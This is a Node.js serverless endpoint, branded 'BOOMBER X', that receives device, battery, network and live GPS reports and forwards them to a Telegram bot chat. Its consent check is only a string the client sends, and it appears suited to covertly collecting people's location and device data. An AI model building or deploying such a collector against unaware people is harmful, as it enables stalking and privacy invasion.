const TELEGRAM_API = "https://api.telegram.org";

function escapeHTML(value) {
  return String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

async function redis(command, ...args) {
  const base = process.env.UPSTASH_REDIS_REST_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN;

  if (!base || !token) {
    throw new Error("Redis configuration missing");
  }

  const response = await fetch(
    `${base.replace(/\/$/, "")}/${command}/${args
      .map((value) => encodeURIComponent(String(value)))
      .join("/")}`,
    {
      headers: {
        Authorization: `Bearer ${token}`
      }
    }
  );

  if (!response.ok) throw new Error("Redis request failed");

  const result = await response.json();
  if (result.error) throw new Error("Redis operation failed");

  return result.result;
}

async function telegram(method, body) {
  const response = await fetch(
    `${TELEGRAM_API}/bot${process.env.BOT_TOKEN}/${method}`,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(body)
    }
  );

  const result = await response.json();

  if (!response.ok || !result.ok) {
    throw new Error("Telegram request failed");
  }

  return result;
}

module.exports = async function handler(req, res) {
  if (req.method !== "POST") {
    res.setHeader("Allow", "POST");
    return res.status(405).json({
      error: "Method not allowed"
    });
  }

  if (
    !process.env.BOT_TOKEN ||
    !process.env.CHAT_ID ||
    !process.env.UPSTASH_REDIS_REST_URL ||
    !process.env.UPSTASH_REDIS_REST_TOKEN
  ) {
    return res.status(500).json({
      error: "Server configuration missing"
    });
  }

  try {
    const report = req.body;

    if (
      !report ||
      typeof report !== "object" ||
      Array.isArray(report)
    ) {
      return res.status(400).json({
        error: "Invalid report"
      });
    }

    // Handle an explicitly user-started live-location session.
    if (report.type === "live_location_update") {
      const sessionId = String(report.sessionId || "");

      if (!/^[a-zA-Z0-9_-]{16,64}$/.test(sessionId)) {
        return res.status(400).json({
          error: "Invalid session ID"
        });
      }

      if (
        report.sharing !== "user_started_and_can_stop" ||
        !report.location ||
        !Number.isFinite(report.location.latitude) ||
        !Number.isFinite(report.location.longitude) ||
        Math.abs(report.location.latitude) > 90 ||
        Math.abs(report.location.longitude) > 180
      ) {
        return res.status(400).json({
          error: "Invalid or unconsented location report"
        });
      }

      const stopped = await redis("GET", `location:stopped:${sessionId}`);
      const stopAll = await redis("GET", "location:stop_all");

      if (stopped === "1" || stopAll === "1") {
        return res.status(200).json({
          success: true,
          stopped: true
        });
      }

      const { latitude, longitude, accuracyMeters } = report.location;

      const message =
        "<b>📍 BOOMBER X — SHARED LOCATION</b>\n\n" +
        "🟢 <b>Sharing:</b> Active\n" +
        `🎯 <b>Accuracy:</b> ${escapeHTML(accuracyMeters ?? "Unknown")} m\n` +
        `<a href="https://www.google.com/maps?q=${latitude},${longitude}">📍 Open shared location</a>\n\n` +
        "<i>Location was submitted through the user's sharing controls.</i>";

      await telegram("sendMessage", {
        chat_id: process.env.CHAT_ID,
        text: message,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{
              text: "⏹ STOP THIS SESSION",
              callback_data: `stop:${sessionId}`
            }],
            [{
              text: "🔴 STOP ALL SHARING",
              callback_data: "stopall"
            }]
          ]
        }
      });

      return res.status(200).json({
        success: true,
        stopped: false
      });
    }

    // Accept only the existing user-submitted report categories.
    const allowed = new Set([
      "device",
      "battery",
      "network",
      "location"
    ]);

    if (
      Object.keys(report).some((key) => !allowed.has(key)) ||
      JSON.stringify(report).length > 15000
    ) {
      return res.status(400).json({
        error: "Unsupported or oversized report"
      });
    }

    await telegram("sendMessage", {
      chat_id: process.env.CHAT_ID,
      text:
        "<b>📱 BOOMBER X — DEVICE REPORT</b>\n\n" +
        "<pre>" +
        escapeHTML(JSON.stringify(report, null, 2)).slice(0, 12000) +
        "</pre>\n" +
        "<i>User-submitted report</i>",
      parse_mode: "HTML"
    });

    return res.status(200).json({
      success: true
    });
  } catch {
    return res.status(500).json({
      error: "Report could not be delivered"
    });
  }
};